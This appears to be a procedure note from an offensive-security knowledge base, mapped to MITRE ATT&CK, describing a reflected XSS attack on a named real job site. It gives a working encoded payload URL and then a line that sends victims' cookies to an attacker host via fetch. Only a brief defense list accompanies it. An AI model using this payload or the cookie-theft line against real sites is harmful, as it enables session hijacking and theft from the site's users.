---
id: p-inject-execute-xss-payload
tags:
  - xss
  - execution
  - javascript
type: procedure
tools:
  - '[[tools/Firefox-Browser]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:47:12.970Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Inject and Execute Malicious XSS Payload

## Summary

This procedure constructs and delivers a full XSS payload via the bypassed URL path, executing arbitrary JavaScript in the browser for potential cookie theft or redirection.

## Description

Using the length-bypassed URL, insert the encoded payload to break out of HTML context and trigger an onload event. On the web platform, this leads to alert(1) execution, extensible to malicious actions like document.cookie exfiltration. Victim interaction via link click is required.

## Requirements

1. Bypassed length limitation
2. Encoded payload ready
3. Target browser environment

## Defense

Defensive measures and detection strategies:

- Encode all reflected inputs with HTML entities
- Implement strict CSP headers
- Monitor for alert() or unusual JS execution in client logs

## Objectives

1. Achieve JavaScript execution
2. Demonstrate impact like alerts or data theft
3. Validate full exploitation

## Instructions

### Step 1: Build Malicious URL

**Context**: Combine the path, payload, and bypassed parameter.

Full URL:

```url
https://www.glassdoor.co.in/Job/%22%3cimg%20src%3dx%20onerro%3d%3e%3csvg%20onload%3dalert%281%29%3epratt-whitney-jobs-SRCH_KE0,50.htm?initiatedFromCountryPicker=true&countryRedirect=true
```

> Access the URL. Expected output: Alert popup with '1' appears, confirming execution.

### Step 2: Extend for Impact

**Context**: Replace alert with payload for cookie theft, e.g., onload=fetch('http://attacker.com?cookie='+document.cookie).

> Expected output: Data sent to attacker-controlled server.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox-Browser]]

## Tags

- [[xss]]
- [[Execution]]
- [[JavaScript]]
